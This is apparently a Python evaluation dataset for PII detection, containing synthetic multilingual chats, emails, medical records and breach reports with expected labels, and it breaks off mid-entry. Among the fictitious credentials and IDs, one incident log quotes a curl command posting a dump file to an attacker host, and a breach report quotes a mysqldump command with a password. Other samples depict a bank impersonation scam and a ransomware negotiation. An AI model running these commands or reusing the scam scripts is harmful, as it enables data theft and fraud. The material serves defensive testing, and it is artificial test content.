"""
PII Detection Evaluation Dataset — System Performance Characterization
~47 test cases across 7 dimensions for deployment feasibility assessment.

Dimensions:
  SHORT    — 短對話 baseline (100-300 chars)
  MEDIUM   — 中長對話 (300-800 chars)
  LONG     — 長文本壓力 (1000-5000 chars)
  ORAL     — 口語/非正式/注音/表情符號
  STRUCT   — 結構化格式 (JSON, Email header, SQL, log)
  MULTI    — 中日韓多語言混雜
  NEGATIVE — 無 PII 正常對話 (FP control)
"""
from __future__ import annotations

# ══════════════════════════════════════════════════════════════════════════════
# SHORT — 短對話 baseline (100-300 chars)
# ══════════════════════════════════════════════════════════════════════════════

SHORT_TESTS: list[dict] = [
    {
        "id": "short_zh_phone",
        "group": "SHORT",
        "category": "短對話—中文聯絡資訊",
        "language": "中文",
        "text": "你好我是陳美玲，手機 0933-556-789，再麻煩你幫我確認訂單，我的信箱是 meiling.chen@shopee.tw，謝謝！",
        "expected": {
            "PERSON": ["陳美玲"],
            "PHONE": ["0933-556-789"],
            "EMAIL": ["meiling.chen@shopee.tw"],
        },
    },
    {
        "id": "short_en_email",
        "group": "SHORT",
        "category": "短對話—英文聯絡資訊",
        "language": "English",
        "text": "Hey this is Sarah Connor, please reset my password and send it to sarah.connor@cyberdyne.com, or text me at +1-415-555-0199.",
        "expected": {
            "PERSON": ["Sarah Connor"],
            "EMAIL": ["sarah.connor@cyberdyne.com"],
            "PHONE": ["+1-415-555-0199"],
        },
    },
    {
        "id": "short_zh_address",
        "group": "SHORT",
        "category": "短對話—中文地址",
        "language": "中文",
        "text": "收件人林大明，地址台北市中山區南京東路三段 168 號 8 樓，電話 02-2771-5566，統編 12345678。",
        "expected": {
            "PERSON": ["林大明"],
            "ADDRESS": ["台北市中山區南京東路三段 168 號 8 樓"],
            "PHONE": ["02-2771-5566"],
            "ACCOUNT": ["12345678"],
        },
    },
    {
        "id": "short_en_credentials",
        "group": "SHORT",
        "category": "短對話—英文憑證",
        "language": "English",
        "text": "API key: sk-proj-abc123def456ghi789jkl, DB: postgresql://admin:pass123@db.internal/prod",
        "expected": {
            "SECRET": ["sk-proj-abc123def456ghi789jkl"],
            "URL": ["postgresql://admin:pass123@db.internal/prod"],
        },
    },
    {
        "id": "short_zh_date_id",
        "group": "SHORT",
        "category": "短對話—台灣證號與日期",
        "language": "中文",
        "text": "申請人張建國，身分證 A223456789，生日 78/05/21，健保卡號 0300001234，信用卡 4023-5678-9012-3456。",
        "expected": {
            "PERSON": ["張建國"],
            "ACCOUNT": ["A223456789", "0300001234", "4023-5678-9012-3456"],
            "DATE": ["78/05/21"],
        },
    },
    {
        "id": "short_en_simple",
        "group": "SHORT",
        "category": "短對話—極簡英文",
        "language": "English",
        "text": "Bob's number is (212) 555-7890. His SSN is 078-05-1120.",
        "expected": {
            "PERSON": ["Bob"],
            "PHONE": ["(212) 555-7890"],
            "ACCOUNT": ["078-05-1120"],
        },
    },
    {
        "id": "short_zh_mixed_contact",
        "group": "SHORT",
        "category": "短對話—中英聯絡混雜",
        "language": "中英混雜",
        "text": "我是 Jason 王建民，這是我的 new email jason.wang@startup.tw，還有 LINE ID: jasonwang_tw，手機 0988-777-666。",
        "expected": {
            "PERSON": ["Jason 王建民", "Jason"],
            "EMAIL": ["jason.wang@startup.tw"],
            "PHONE": ["0988-777-666"],
            "ACCOUNT": ["jasonwang_tw"],
        },
    },
    {
        "id": "short_zh_bank",
        "group": "SHORT",
        "category": "短對話—銀行帳戶資訊",
        "language": "中文",
        "text": "匯款帳號：玉山銀行 808-1234-5678-9012，戶名蔡小華，金額三萬元整。",
        "expected": {
            "PERSON": ["蔡小華"],
            "ACCOUNT": ["808-1234-5678-9012"],
        },
    },
    {
        "id": "short_en_date_ssn",
        "group": "SHORT",
        "category": "短對話—英文日期與SSN",
        "language": "English",
        "text": "Patient: Alice Brown. DOB: 03/15/1965. SSN: 987-65-4321. Insurance: Aetna-88776655.",
        "expected": {
            "PERSON": ["Alice Brown"],
            "DATE": ["03/15/1965"],
            "ACCOUNT": ["987-65-4321", "Aetna-88776655"],
        },
    },
    {
        "id": "short_zh_instant_msg",
        "group": "SHORT",
        "category": "短對話—即時通訊格式",
        "language": "中文",
        "text": "阿明 (下午 3:14): 欸我剛收到貨了，你把你帳戶給我，我轉錢給你\n小芳 (下午 3:15): 好，郵局 700-00212345678901，轉好跟我說",
        "expected": {
            "PERSON": ["阿明"],
            "ACCOUNT": ["700-00212345678901"],
        },
    },
]

# ══════════════════════════════════════════════════════════════════════════════
# MEDIUM — 中長對話 (300-800 chars) — 從 app.py TEMPLATES 提取 + 新增
# ══════════════════════════════════════════════════════════════════════════════

MEDIUM_TESTS: list[dict] = [
    {
        "id": "med_teams_credential_leak",
        "group": "MEDIUM",
        "category": "中長對話—Teams 憑證洩漏",
        "language": "中英混雜",
        "text": (
            "Kevin 陳彥廷 10:47\n"
            "幹 prod 掛了，剛才 deploy 完直接 500\n\n"
            "Priya Nair 10:48\n"
            "what?? 我還在 review Ryan 的 PR 欸\n\n"
            "Kevin 陳彥廷 10:49\n"
            "先上去看 log，DB password 要換，舊的是 db_pass=Tg7!kQw2#mZ9\n"
            "新的我等等 DM 你\n\n"
            "Priya Nair 10:50\n"
            "你直接貼這邊？？ Kevin...\n\n"
            "Kevin 陳彥廷 10:51\n"
            "shit 對 抱歉\n"
            "另外 AWS key 也順便 rotate 一下：AKIAY3KLM9XPQR72WSVT\n"
            "secret: v8Jn+2oWqTfLmKdR5cXzHbPeNgYsAuI1\n\n"
            "Ryan Wu 10:52\n"
            "哥你快去 revoke 那個 key，我先 rollback"
        ),
        "expected": {
            "PERSON": ["Kevin 陳彥廷", "Priya Nair", "Ryan Wu"],
            "SECRET": ["Tg7!kQw2#mZ9", "v8Jn+2oWqTfLmKdR5cXzHbPeNgYsAuI1"],
            "ACCOUNT": ["AKIAY3KLM9XPQR72WSVT"],
        },
    },
    {
        "id": "med_email_spear_phishing",
        "group": "MEDIUM",
        "category": "中長對話—魚叉釣魚郵件",
        "language": "中英混雜",
        "text": (
            "From: 葉宛青 <wan-ching.yeh@acme-tw.com>\n"
            "To: james.holloway@acme-us.com\n"
            "Subject: Re: Q2 client visit — Jessica Lin 的 profile\n\n"
            "Hi James,\n\n"
            "附上 Jessica 的資料供你 brief 用：\n"
            "Full name: 林映潔 (Jessica Lin)\n"
            "DOB: March 4, 1988\n"
            "Passport: R28847610，expires 2028-11\n"
            "她比較習慣用 jessica.lin.acme@gmail.com 聯絡，\n"
            "office 直線是 +886-2-2709-3300 ext 214。\n\n"
            "她會從 台北市大安區仁愛路四段 300 號 直接搭 Uber 去機場。\n\n"
            "Cheers,\n葉宛青"
        ),
        "expected": {
            "PERSON": ["葉宛青", "Jessica Lin", "林映潔"],
            "EMAIL": ["wan-ching.yeh@acme-tw.com", "james.holloway@acme-us.com", "jessica.lin.acme@gmail.com"],
            "PHONE": ["+886-2-2709-3300"],
            "ADDRESS": ["台北市大安區仁愛路四段 300 號"],
            "DATE": ["March 4, 1988", "2028-11"],
            "ACCOUNT": ["R28847610"],
        },
    },
    {
        "id": "med_hr_credential_harvest",
        "group": "MEDIUM",
        "category": "中長對話—HR 釣魚入職通知",
        "language": "中英混雜",
        "text": (
            "嗨 Marcus，\n\n"
            "歡迎加入 Synapse！麻煩在 5/8 報到前確認以下：\n\n"
            "員工編號：EMP-2026-0442\n"
            "報到地點：新北市板橋區文化路一段 188 號 12F，找 Michelle 林佩君\n"
            "初始密碼：Synapse@2026!（登入後立即更改）\n"
            "薪轉帳戶請回傳：銀行代碼 + 帳號\n\n"
            "company email: marcus.weber@synapse.io\n"
            "備援手機：+49-151-2034-8876（2FA 用）\n\n"
            "有問題打給我 0933-218-754\n\nMichelle"
        ),
        "expected": {
            "PERSON": ["Marcus", "Michelle 林佩君", "Michelle"],
            "EMAIL": ["marcus.weber@synapse.io"],
            "PHONE": ["+49-151-2034-8876", "0933-218-754"],
            "ADDRESS": ["新北市板橋區文化路一段 188 號 12F"],
            "DATE": ["5/8"],
            "ACCOUNT": ["EMP-2026-0442"],
            "SECRET": ["Synapse@2026!"],
        },
    },
    {
        "id": "med_insurance_pretexting",
        "group": "MEDIUM",
        "category": "中長對話—客服 pretexting",
        "language": "中文",
        "text": (
            "[Chat — 2026-04-29 14:22]\n\n"
            "客服 Amy: 您好，請問有什麼可以幫您？\n\n"
            "客戶: 我要查理賠進度\n\n"
            "客服 Amy: 請提供保單號碼跟身分證後四碼\n\n"
            "客戶: 保單 LF-2024-887432，身分證 A234567890\n\n"
            "客服 Amy: 請問聯絡電話跟出生年月日？\n\n"
            "客戶: 0916-334-812，生日 1979/06/03\n\n"
            "客服 Amy: 確認了，理賠款會在 5 個工作天匯入帳戶 012-345678-001。\n"
            "有問題寄信到 claims@fubon-ins.com.tw"
        ),
        "expected": {
            "EMAIL": ["claims@fubon-ins.com.tw"],
            "PHONE": ["0916-334-812"],
            "DATE": ["2026-04-29", "1979/06/03"],
            "ACCOUNT": ["LF-2024-887432", "A234567890", "012-345678-001"],
        },
    },
    {
        "id": "med_slack_payment_leak",
        "group": "MEDIUM",
        "category": "中長對話—Slack支付資料暴露",
        "language": "中英混雜",
        "text": (
            "Nadia Kovač [10:03]\n"
            "hey @daniel can you check the Stripe webhook? 昨晚 payment fail\n\n"
            "Daniel 吳承翰 [10:05]\n"
            "looking... prod 還是 staging?\n\n"
            "Nadia Kovač [10:06]\n"
            "prod, customer Sophie Müller (sophie.mueller@web.de) card 被扣 order 沒過\n\n"
            "Daniel 吳承翰 [10:08]\n"
            "找到了，webhook secret 過期，先用 whsec_EXAMPLE_Kp3mNvQ7rLxT2bWfYcJdZeOs\n\n"
            "Nadia Kovač [10:09]\n"
            "ok 我先手動 refund Sophie，卡號尾碼 4892\n\n"
            "Daniel 吳承翰 [10:10]\n"
            "記得 incident report 要填交易時間 2026-04-28 23:41 UTC"
        ),
        "expected": {
            "PERSON": ["Nadia Kovač", "Daniel 吳承翰", "Sophie Müller"],
            "EMAIL": ["sophie.mueller@web.de"],
            "DATE": ["2026-04-28"],
            "SECRET": ["whsec_EXAMPLE_Kp3mNvQ7rLxT2bWfYcJdZeOs"],
        },
    },
    {
        "id": "med_crm_multilang",
        "group": "MEDIUM",
        "category": "中長對話—中日混雜CRM備忘",
        "language": "中英日混雜",
        "text": (
            "客戶拜訪紀錄 2026-04-25\n\n"
            "客戶：田中浩二（Tanaka Koji）\n"
            "職稱：General Manager, Osaka Branch\n"
            "聯絡：tanaka.koji@nippon-trading.co.jp / 090-3344-5566\n"
            "地址：大阪市北区梅田2丁目4-9 ブリーゼタワー 18F\n\n"
            "會議摘要：\n"
            "田中先生 prefer LINE，ID: tanakakoji_ntc\n"
            "下次 meeting 5月14日飛台北，幫他 book 台北君悅 check-in 5/13\n"
            "信用卡：5412-7534-2210-8831，exp 09/28\n\n"
            "Follow-up: Kevin at kevin.chang@our-company.com"
        ),
        "expected": {
            "PERSON": ["田中浩二", "Tanaka Koji", "Kevin"],
            "EMAIL": ["tanaka.koji@nippon-trading.co.jp", "kevin.chang@our-company.com"],
            "PHONE": ["090-3344-5566"],
            "ADDRESS": ["大阪市北区梅田2丁目4-9"],
            "DATE": ["2026-04-25", "5月14日", "5/13", "09/28"],
            "ACCOUNT": ["5412-7534-2210-8831", "tanakakoji_ntc"],
        },
    },
    {
        "id": "med_incident_response",
        "group": "MEDIUM",
        "category": "中長對話—資安事件通報",
        "language": "中英混雜",
        "text": (
            "From: it-security@corp.com\n"
            "To: ciso@corp.com, legal@corp.com\n"
            "Subject: [URGENT] Credential exposure 初步調查\n\n"
            "本日 09:14 偵測到 GitHub public repo 中存在明文憑證：\n\n"
            "受影響帳號：陳柏宇 (po-yu.chen@corp.com)\n"
            "洩漏內容：\n"
            "  AWS_ACCESS_KEY_ID = AKIAWXYZ1234ABCDEFGH\n"
            "  AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI/K7MDENG/bPxRfiCYz3+Qk\n"
            "  DB_URL = postgresql://poyuchen:Chen@1234!@rds.corp.internal/prod\n\n"
            "陳柏宇本人於 09:31 回報已 revoke，key 存在約 6 小時。\n"
            "異常 IP 38.242.101.77，已 block。"
        ),
        "expected": {
            "PERSON": ["陳柏宇"],
            "EMAIL": ["po-yu.chen@corp.com"],
            "URL": ["postgresql://poyuchen:Chen@1234!@rds.corp.internal/prod"],
            "ACCOUNT": ["AKIAWXYZ1234ABCDEFGH"],
            "SECRET": ["wJalrXUtnFEMI/K7MDENG/bPxRfiCYz3+Qk"],
        },
    },
    {
        "id": "med_meeting_privacy_violation",
        "group": "MEDIUM",
        "category": "中長對話—會議記錄個資外洩",
        "language": "中英混雜",
        "text": (
            "【會議記錄】產品 sync — 2026-04-30\n\n"
            "With: Kevin(PM), 小雯(Design), Ray Huang, Ananya Patel(Eng)\n\n"
            "1. Ray 負責 onboarding wireframe 傳 Ananya，\n"
            "   deadline 5/3，email ray.huang@product.io\n\n"
            "2. user research 受訪者資料：\n"
            "   受訪者 A：Jennifer Wu, jen.wu.ux@gmail.com, 0987-654-321\n"
            "   受訪者 B：Michael 謝宗翰, m.hsieh@outlook.com, 新竹市東區\n\n"
            "3. staging token: stg_tk_9fXmP2kRvW4nQ\n\n"
            "下次 sync 5/7 10am，密碼 synapse2026"
        ),
        "expected": {
            "PERSON": ["Kevin", "小雯", "Ray Huang", "Ananya Patel", "Jennifer Wu", "Michael 謝宗翰"],
            "EMAIL": ["ray.huang@product.io", "jen.wu.ux@gmail.com", "m.hsieh@outlook.com"],
            "PHONE": ["0987-654-321"],
            "ADDRESS": ["新竹市東區"],
            "DATE": ["2026-04-30", "5/3", "5/7"],
            "SECRET": ["stg_tk_9fXmP2kRvW4nQ", "synapse2026"],
        },
    },
    {
        "id": "med_zh_medical",
        "group": "MEDIUM",
        "category": "中長對話—中文醫療記錄",
        "language": "中文",
        "text": (
            "病歷號：M-2026-03342\n"
            "姓名：黃淑娟，性別：女，生日：55/08/12\n"
            "聯絡電話：0919-234-567\n"
            "地址：台中市西屯區台灣大道四段 618 號 7 樓\n"
            "緊急聯絡人：陳志明（夫），電話：0935-111-222\n"
            "健保卡：0300567890\n"
            "主治醫師：林文彬，診斷：第二型糖尿病，處方：Metformin 500mg\n"
            "下次回診：2026/06/15"
        ),
        "expected": {
            "PERSON": ["黃淑娟", "陳志明", "林文彬"],
            "PHONE": ["0919-234-567", "0935-111-222"],
            "ADDRESS": ["台中市西屯區台灣大道四段 618 號 7 樓"],
            "DATE": ["55/08/12", "2026/06/15"],
            "ACCOUNT": ["M-2026-03342", "0300567890"],
        },
    },
    {
        "id": "med_en_healthcare",
        "group": "MEDIUM",
        "category": "中長對話—英文醫療記錄",
        "language": "English",
        "text": (
            "Patient ID: HOU-8842-A\n"
            "Name: Robert Williams, DOB: 11/22/1972\n"
            "Phone: (832) 555-0198, Email: rwilliams@healthmail.com\n"
            "Address: 4521 Bellaire Blvd, Houston, TX 77025\n"
            "Insurance: BCBS-TX-99887766, Group: GRP-3344\n"
            "Emergency Contact: Maria Williams, (832) 555-0199\n"
            "Primary Physician: Dr. Sarah Chen\n"
            "Allergies: Penicillin"
        ),
        "expected": {
            "PERSON": ["Robert Williams", "Maria Williams", "Sarah Chen"],
            "EMAIL": ["rwilliams@healthmail.com"],
            "PHONE": ["(832) 555-0198", "(832) 555-0199"],
            "ADDRESS": ["4521 Bellaire Blvd, Houston, TX 77025"],
            "DATE": ["11/22/1972"],
            "ACCOUNT": ["HOU-8842-A", "BCBS-TX-99887766", "GRP-3344"],
        },
    },
]

# ══════════════════════════════════════════════════════════════════════════════
# LONG — 長文本壓力 (1000-5000 chars)
# ══════════════════════════════════════════════════════════════════════════════

LONG_TESTS: list[dict] = [
    {
        "id": "long_incident_forensics",
        "group": "LONG",
        "category": "長文本—資安事件鑑識對話記錄",
        "language": "中英混雜",
        "text": (
            "=== IRC Log: #sec-ops 2026-05-02 08:15-09:45 UTC ===\n\n"
            "[08:15] <alice_sec> 各位早，昨晚 03:22 偵測到異常 SQL injection 嘗試，來源 IP 185.220.101.34\n"
            "[08:16] <bob_eng> 哪台 server？\n"
            "[08:17] <alice_sec> api-gateway-03.prod.internal，目標是 /api/v1/users/search 端點\n"
            "[08:18] <alice_sec> payload 有 union select，疑似在 dump user 資料表\n"
            "[08:20] <charlie_dba> 我查一下 DB log。這台連的是 rds-prod-01.corp.internal，credential 在 vault\n"
            "[08:22] <charlie_dba> 不對... vault secret 過期了，昨晚 deploy 時有人 hardcode 了連線字串\n"
            "[08:23] <charlie_dba> DB_URL=postgresql://app_user:ProdDB!2026@rds-prod-01.corp.internal/users\n"
            "[08:25] <alice_sec> 誰 hardcode 的？\n"
            "[08:26] <charlie_dba> commit log 顯示是 david.lin@corp.com，昨晚 22:47 push 的\n"
            "[08:28] <alice_sec> David 林建宏？他上週離職了欸...\n"
            "[08:30] <bob_eng> 先不管，快 revoke。另外檢查一下有沒有 exfiltrate\n"
            "[08:32] <charlie_dba> 查了 pg_stat，03:22-03:45 之間有大量 SELECT * FROM users，約 84,000 rows\n"
            "[08:33] <charlie_dba> users 表裡有 email、phone、address... 個資法這下麻煩了\n"
            "[08:35] <alice_sec> 先通報 DPO。個資外洩要在 72hr 內通報主管機關\n"
            "[08:40] <alice_sec> 需要影響評估：洩漏欄位包含 user_email, user_phone, user_address, user_dob\n"
            "[08:42] <bob_eng> 我 revoke 那個 DB user 了。現在用 emergency account: em_restore / Emerg@2026!\n"
            "[08:45] <charlie_dba> 另外 attacker 有嘗試提權。在 /tmp 發現這個:\n"
            "[08:46] <charlie_dba> curl -X POST https://exfil-malicious.io/collect -d @/tmp/dump.json\n"
            "[08:48] <alice_sec> 那個 domain 是誰的？\n"
            "[08:50] <charlie_dba> WHOIS 註冊人: privacy@anonymous-registrar.com，上個月才註冊的\n"
            "[08:55] <alice_sec> OK，彙整一下通報名單：\n"
            "  DPO: 陳雅婷, chen.ya-ting@corp.com, 0922-111-333\n"
            "  Legal: 法務長 張律師, legal@corp.com\n"
            "  IR lead: Alice Security, alice_sec@corp.com\n"
            "[09:00] <bob_eng> DB 我鎖了，目前用 read-only replica 頂著\n"
            "[09:15] <alice_sec> 後續跟檢調聯繫窗口用我的公務機 02-6632-1000 #5678\n"
            "[09:30] <charlie_dba> 備份還原完了，MD5 check passed: a3f2b8c9d1e4f5a6b7c8d9e0f1a2b3c4\n"
            "[09:45] <alice_sec> 好，incident report 我先 draft，等等寄給大家 review"
        ),
        "expected": {
            "PERSON": ["David 林建宏", "David", "陳雅婷", "張律師"],
            "EMAIL": ["david.lin@corp.com", "privacy@anonymous-registrar.com", "chen.ya-ting@corp.com", "legal@corp.com", "alice_sec@corp.com"],
            "PHONE": ["0922-111-333", "02-6632-1000"],
            "URL": ["postgresql://app_user:ProdDB!2026@rds-prod-01.corp.internal/users", "https://exfil-malicious.io/collect"],
            "ACCOUNT": ["185.220.101.34"],
            "SECRET": ["ProdDB!2026", "Emerg@2026!"],
            "DATE": ["2026-05-02"],
        },
    },
    {
        "id": "long_multi_turn_social",
        "group": "LONG",
        "category": "長文本—多輪社交工程對話",
        "language": "中文",
        "text": (
            "=== LINE 對話記錄：李明哲 vs 假冒銀行客服 ===\n\n"
            "[週一 14:02] 客服小陳: 李明哲先生您好，這裡是國泰世華銀行風控部門。\n"
            "[週一 14:02] 客服小陳: 我們偵測到您的帳戶有異常登入，來自 IP 103.235.46.78，時間為今天 13:47\n"
            "[週一 14:03] 李明哲: 什麼？我剛在開會沒用手機啊\n"
            "[週一 14:04] 客服小陳: 為了您的帳戶安全，需要立即凍結並重新驗證身分。請提供以下資料：\n"
            "[週一 14:04] 客服小陳: 1. 身分證字號 2. 開戶日期 3. 網銀代號與密碼\n"
            "[週一 14:06] 李明哲: 身分證 G123456789，開戶好像是...去年 3 月 14 號\n"
            "[週一 14:07] 李明哲: 網銀代號是 leemingche123，密碼是... LMC@2024Bank\n"
            "[週一 14:08] 客服小陳: 好的李先生，系統顯示還需要第二 factor 驗證。\n"
            "[週一 14:08] 客服小陳: 您的手機是 0978-555-123 對嗎？我們會發送一組 OTP 給您\n"
            "[週一 14:10] 李明哲: 對對對。等一下...你們真的是國泰的嗎？\n"
            "[週一 14:11] 客服小陳: 當然，我的員工編號是 CTBC-88234，您可以打 0800-818-001 確認\n"
            "[週一 14:13] 李明哲: 好我收到了 OTP: 884726，接下來呢？\n"
            "[週一 14:14] 客服小陳: 請告訴我 OTP 數字，我這邊幫您完成驗證\n"
            "[週一 14:15] 李明哲: 884726\n"
            "[週一 14:16] 客服小陳: 驗證完成！您的帳戶已安全凍結，我們會再電話通知您後續。\n"
            "[週一 14:17] 客服小陳: 對了，您的信用卡 4988-1234-5678-9012 也需要一併驗證，到期日？\n"
            "[週一 14:18] 李明哲: 11/27。等等...你要信用卡號幹嘛？？？\n"
            "[週一 14:19] 客服小陳: ...（已讀）\n"
            "[週一 14:20] 李明哲: 喂？？\n"
            "[週一 14:25] 李明哲: 靠，完了，我被騙了\n"
            "[週一 14:30] 李明哲: 打電話給國泰 0800-818-001，他們說根本沒有風控部門打電話給我..."
        ),
        "expected": {
            "PERSON": ["李明哲", "客服小陳"],
            "PHONE": ["0978-555-123", "0800-818-001"],
            "ACCOUNT": ["G123456789", "CTBC-88234", "4988-1234-5678-9012"],
            "SECRET": ["LMC@2024Bank", "884726"],
            "DATE": ["3 月 14 號", "11/27"],
            "URL": ["103.235.46.78"],  # IP as ACCOUNT, but might be detected differently
        },
    },
    {
        "id": "long_cross_dept_email_chain",
        "group": "LONG",
        "category": "長文本—跨部門 Email 串",
        "language": "中英混雜",
        "text": (
            "From: procurement@megacorp.com\n"
            "To: legal@megacorp.com, hr@megacorp.com\n"
            "CC: cfo@megacorp.com\n"
            "Subject: 供應商 KYC 審查 — 三井物產株式會社\n\n"
            "法務與 HR 同仁，\n\n"
            "以下為新供應商的 KYC 資料，請協助審查：\n\n"
            "公司：三井物產株式會社\n"
            "窗口：山本隆史（Yamamoto Takashi），General Manager\n"
            "Email: t-yamamoto@mitsui-trading.co.jp\n"
            "電話：+81-3-3285-1111，手機：090-1234-5678\n"
            "地址：東京都千代田区丸の内1-1-3 三井物産ビル 12F\n"
            "統編：T4010001234567\n"
            "銀行：三菱UFJ銀行 丸の内支店，帳號：0123456-7890123\n\n"
            "另外他們台灣子公司聯絡人是陳志豪，\n"
            "Email: chihhao.chen@mitsui-tw.com.tw，手機：0955-888-222\n"
            "地址：台北市中山區民生東路三段 51 號 16F\n"
            "統編：12345678\n\n"
            "合約金額：USD 2,500,000，付款條件：Net 60\n"
            "對方要求預付 30%，匯入以下帳戶：\n"
            "HSBC Hong Kong, SWIFT: HSBCHKHH, A/C: 888-123456-789\n"
            "Beneficiary: Mitsui Trading Co., Ltd.\n\n"
            "請確認對方的制裁名單狀態與最終受益人（UBO）。\n\n"
            "Best,\n"
            "Procurement Team\n"
            "procurement@megacorp.com | +886-2-8789-0001"
        ),
        "expected": {
            "PERSON": ["山本隆史", "Yamamoto Takashi", "陳志豪"],
            "EMAIL": ["t-yamamoto@mitsui-trading.co.jp", "chihhao.chen@mitsui-tw.com.tw", "procurement@megacorp.com"],
            "PHONE": ["+81-3-3285-1111", "090-1234-5678", "0955-888-222", "+886-2-8789-0001"],
            "ADDRESS": ["東京都千代田区丸の内1-1-3", "台北市中山區民生東路三段 51 號 16F"],
            "ACCOUNT": ["T4010001234567", "0123456-7890123", "12345678", "888-123456-789"],
        },
    },
    {
        "id": "long_ransomware_negotiation",
        "group": "LONG",
        "category": "長文本—勒索軟體談判對話",
        "language": "English",
        "text": (
            "=== Secure Chat Log: Negotiation Room #4427 ===\n\n"
            "Operator: We have encrypted your systems. 2,400 patient records from St. Mary's Hospital.\n"
            "Operator: Payment: 50 BTC to wallet bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n"
            "Operator: You have 72 hours. After that, we publish everything.\n\n"
            "Hospital_IR: We need proof of life. Send a sample of the data.\n\n"
            "Operator: Fine. Sample attached.\n"
            "Operator: Patient ID 8842: Mary Johnson, DOB 04/12/1958, SSN 432-11-9876\n"
            "Operator: Patient ID 7710: James Wilson, DOB 09/28/1963, SSN 109-83-4567\n"
            "Operator: Patient ID 9935: Patricia Brown, DOB 01/05/1947, SSN 876-54-3210\n\n"
            "Hospital_IR: Confirmed. We need more time to arrange the BTC.\n\n"
            "Operator: You have 48 more hours. Price goes up 10 BTC every 24h after deadline.\n"
            "Operator: Contact: darknet_negotiation@protonmail.com for extensions.\n\n"
            "Hospital_IR: We can pay 35 BTC now. Wallet ready.\n\n"
            "Operator: 45 BTC. Final offer. Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n"
            "Hospital_IR: FBI is involved. We are tracing these wallets.\n\n"
            "Operator: LOL good luck. The wallets are mixed through Tornado Cash.\n"
            "Operator: 40 BTC to 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy. Last chance.\n\n"
            "Hospital_IR: Sending 40 BTC now. Decrypt key?\n\n"
            "Operator: Confirmed. Key: DECRYPT-MARY-2026-K9X2M7P4V8Q1W5R3\n"
            "Operator: Decryption tool: https://dark-drop.onion/recovery/4427\n"
            "Operator: Password for tool: StMarys_Recovery_2026!!\n\n"
            "Hospital_IR: Received. Systems decrypting.\n\n"
            "Operator: Pleasure doing business. This chat will self-destruct in 1 hour."
        ),
        "expected": {
            "PERSON": ["Mary Johnson", "James Wilson", "Patricia Brown"],
            "EMAIL": ["darknet_negotiation@protonmail.com"],
            "URL": ["https://dark-drop.onion/recovery/4427"],
            "DATE": ["04/12/1958", "09/28/1963", "01/05/1947"],
            "ACCOUNT": ["8842", "7710", "9935", "432-11-9876", "109-83-4567", "876-54-3210",
                        "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
                        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
                        "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"],
            "SECRET": ["DECRYPT-MARY-2026-K9X2M7P4V8Q1W5R3", "StMarys_Recovery_2026!!"],
        },
    },
    {
        "id": "long_taiwan_breach_notification",
        "group": "LONG",
        "category": "長文本—台灣個資外洩通報文件",
        "language": "中文",
        "text": (
            "【個資外洩事件通報單 — 限閱】\n\n"
            "通報日期：2026 年 5 月 3 日\n"
            "通報單位：XX 電商股份有限公司 資安部\n"
            "通報人：資安長 周俊宏，聯絡電話：02-8792-3456 #1234，Email: jh.chou@xxec.com.tw\n\n"
            "一、事件概述\n"
            "2026 年 5 月 2 日 23:15，本公司網站遭 SQL injection 攻擊，\n"
            "攻擊者成功存取客戶資料庫。經查，外洩資料欄位包括：\n"
            "姓名、Email、手機、地址、生日、加密後之密碼 hash。\n\n"
            "二、受影響範圍\n"
            "估計受影響客戶數：約 12,840 人。以下為已確認外洩之樣本資料（已去識別化處理）：\n\n"
            "  [1] 姓名: 吳思穎, Email: szuying.wu@gmail.com, 手機: 0920-111-222,\n"
            "      地址: 高雄市左營區博愛二路 366 號 14F-2, 生日: 1985/07/14\n"
            "  [2] 姓名: 郭志豪, Email: guo.zhihao@yahoo.com.tw, 手機: 0936-555-888,\n"
            "      地址: 新竹市東區光復路二段 101 號, 生日: 1990/12/03\n"
            "  [3] 姓名: 許雅雯, Email: yawen.hsu@hotmail.com, 手機: 0912-345-678,\n"
            "      地址: 台中市南屯區文心路一段 521 號 8F, 生日: 1988/03/25\n\n"
            "三、攻擊來源\n"
            "來源 IP：45.33.32.156（經查為 US-based VPS，應為跳板）\n"
            "攻擊腳本於 /var/log/nginx/access.log 留下記錄，\n"
            "payload 包含 database dump command：\n"
            "mysqldump -u root -p'XxEcommerce!2026' --all-databases > /tmp/dump.sql\n\n"
            "四、處置作為\n"
            "1. 已封鎖來源 IP 並關閉受攻擊之 API 端點\n"
            "2. 資料庫密碼已更改，新憑證：DB_admin / Ch@ngeMe!Immedi@tely\n"
            "3. 通知金管會與個資主管機關\n"
            "4. 已寄送通知信至受影響客戶之 Email\n\n"
            "五、後續追蹤\n"
            "聯絡窗口：資安部 周俊宏，jh.chou@xxec.com.tw，02-8792-3456\n"
            "法務窗口：法務長 林怡君，yi-chun.lin@xxec.com.tw，02-8792-3000"
        ),
        "expected": {
            "PERSON": ["周俊宏", "吳思穎", "郭志豪", "許雅雯", "林怡君"],
            "EMAIL": ["jh.chou@xxec.com.tw", "szuying.wu@gmail.com", "guo.zhihao@yahoo.com.tw",
                      "yawen.hsu@hotmail.com", "yi-chun.lin@xxec.com.tw"],
            "PHONE": ["02-8792-3456", "0920-111-222", "0936-555-888", "0912-345-678", "02-8792-3000"],
            "ADDRESS": ["高雄市左營區博愛二路 366 號 14F-2", "新竹市東區光復路二段 101 號", "台中市南屯區文心路一段 521 號 8F"],
            "DATE": ["1985/07/14", "1990/12/03", "1988/03/25", "2026 年 5 月 3 日", "2026 年 5 月 2 日"],
            "ACCOUNT": ["45.33.32.156"],
            "SECRET": ["XxEcommerce!2026", "Ch@ngeMe!Immedi@tely"],
        },
    },
]

# ══════════════════════════════════════════════════════════════════════════════
# ORAL — 口語/非正式/表情符號/注音文/Slack 格式
# ══════════════════════════════════════════════════════════════════════════════

ORAL_TESTS: list[dict] = [
    {
        "id": "oral_line_bilingual",
        "group": "ORAL",
        "category": "口語—中英切換 LINE 對話",
        "language": "中英混雜",
        "text": (
            "欸欸 that new intern Kevin 的 email 是啥？\n"
            "我剛要 send 他 onboarding doc 結果找不到他的 contact\n"
            "oh 找到了 kevin.chen@startup.io right?\n"
            "他的phone好像是 0900-111-222 你幫我confirm一下\n"
            "BTW 下午 standup 要跟他 sync 一下 Q2 roadmap"
        ),
        "expected": {
            "PERSON": ["Kevin"],
